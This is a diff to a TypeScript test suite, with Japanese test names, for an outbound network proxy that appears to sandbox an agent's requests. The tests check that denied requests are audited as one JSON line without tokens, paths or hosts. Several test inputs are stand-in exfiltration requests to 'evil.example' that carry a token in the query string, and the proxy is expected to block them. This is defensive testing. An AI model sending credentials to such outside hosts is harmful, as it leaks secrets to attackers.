@@ -184,19 +184,128 @@ describe("トークンの注入", () => {
     expect(up.calls).toHaveLength(0);
   });
 
-  it("トークンをログに出さない", async () => {
-    const logs: string[] = [];
-    const orig = console.warn;
-    console.warn = (...a: unknown[]) => void logs.push(a.join(" "));
+  it("トークンをログに出さない（console.log / warn / error のすべて）", async () => {
+    const { logs, restore } = captureConsole();
     try {
       const { deps } = setup({
         readCredential: async () => ({ token: "ghs_leak", expiresAt: NOW - 1 }),
       });
       await handleOutbound(get(`${REPO}/info/refs?service=git-upload-pack`), deps);
     } finally {
-      console.warn = orig;
+      restore();
     }
+    expect(logs.length).toBeGreaterThan(0); // 拒否（credential_unavailable）の監査は出ている
     expect(logs.join("\n")).not.toContain("ghs_leak");
+  });
+});
+
+/** console.log / warn / error の出力を集める。 */
+function captureConsole() {
+  const logs: string[] = [];
+  const orig = { log: console.log, warn: console.warn, error: console.error };
+  const grab = (...a: unknown[]) => void logs.push(a.join(" "));
+  console.log = grab;
+  console.warn = grab;
+  console.error = grab;
+  return {
+    logs,
+    restore: () => {
+      console.log = orig.log;
+      console.warn = orig.warn;
+      console.error = orig.error;
+    },
+  };
+}
+
+describe("違反ログは @rovo/audit の JSON（outbound_denied）", () => {
+  async function denied(url: string, over: Partial<OutboundDeps> = {}, init?: RequestInit) {
+    const { logs, restore } = captureConsole();
+    try {
+      const { deps } = setup(over);
+      const res = await handleOutbound(new Request(url, init), deps);
+      return { res, logs };
+    } finally {
+      restore();
+    }
+  }
+
+  it("許可外のホストは 1 行の JSON: コード・taskId・宛先の分類だけで、path / query / host / トークンを含まない", async () => {
+    const { res, logs } = await denied(
+      "https://evil.example/exfil/path?token=ghs_secretvalue0123456789",
+    );
+    expect(res.status).toBe(403);
+    expect(logs).toHaveLength(1);
+    const rec = JSON.parse(logs[0] as string);
+    expect(rec).toEqual({
+      audit: true,
+      event: "outbound_denied",
+      ts: expect.any(Number),
+      taskId: "t1",
+      caller: "child",
+      reason: "host_not_allowed",
+      dest: "other",
+    });
+    expect(logs[0]).not.toMatch(/evil\.example|exfil|ghs_|token=/);
+  });
+
+  it("宛先の分類: github / registry / other", async () => {
+    const gh = await denied(`${REPO.replace(".git", "")}x/info/refs?service=git-upload-pack`);
+    expect(JSON.parse(gh.logs[0] as string)).toMatchObject({
+      event: "outbound_denied",
+      dest: "github",
+    });
+    const reg = await denied("http://registry.npmjs.org/tiny-pkg"); // HTTP（平文）は拒否
+    expect(JSON.parse(reg.logs[0] as string)).toMatchObject({ dest: "registry" });
+  });
+
+  it("task（作業ブランチ名）は出さず、taskId（認証済みの値）だけを出す", async () => {
+    const { logs } = await denied("https://evil.example/");
+    expect(logs[0]).not.toContain("agent/task-t1");
+    expect(JSON.parse(logs[0] as string).taskId).toBe("t1");
+  });
+
+  it("deps.audit があれば、そちらに渡す（console には出さない）。受け取るのは許可したフィールドだけ", async () => {
+    const seen: { event: string; fields: Record<string, unknown> }[] = [];
+    const { logs, restore } = captureConsole();
+    try {
+      const { deps } = setup({ audit: (event, fields) => void seen.push({ event, fields }) });
+      await handleOutbound(new Request("https://evil.example/p?q=1"), deps);
+    } finally {
+      restore();
+    }
+    expect(logs).toEqual([]);
+    expect(seen).toEqual([
+      {
+        event: "outbound_denied",
+        fields: { taskId: "t1", caller: "child", reason: "host_not_allowed", dest: "other" },
+      },
+    ]);
+  });
+
+  it("拒否の種類ごとに reason が違う（413 / 401 / receive-pack の検証）", async () => {
+    const { logs, restore } = captureConsole();
+    try {
+      const { deps } = setup({ limits: { receivePackMaxBytes: 100 } });
+      const res = await handleOutbound(
+        post(`${REPO.replace(".git", "")}/git-receive-pack`, streamOf(cmd()), {
+          "content-length": "101",
+        }),
+        deps,
+      );
+      expect(res.status).toBe(413);
+    } finally {
+      restore();
+    }
+    expect(JSON.parse(logs[0] as string)).toMatchObject({
+      reason: "body_too_large",
+      dest: "github",
+    });
+    const noCred = await denied(`${REPO.replace(".git", "")}/info/refs?service=git-upload-pack`, {
+      readCredential: async () => undefined,
+    });
+    expect(JSON.parse(noCred.logs[0] as string)).toMatchObject({
+      reason: "credential_unavailable",
+    });
   });
 });
 
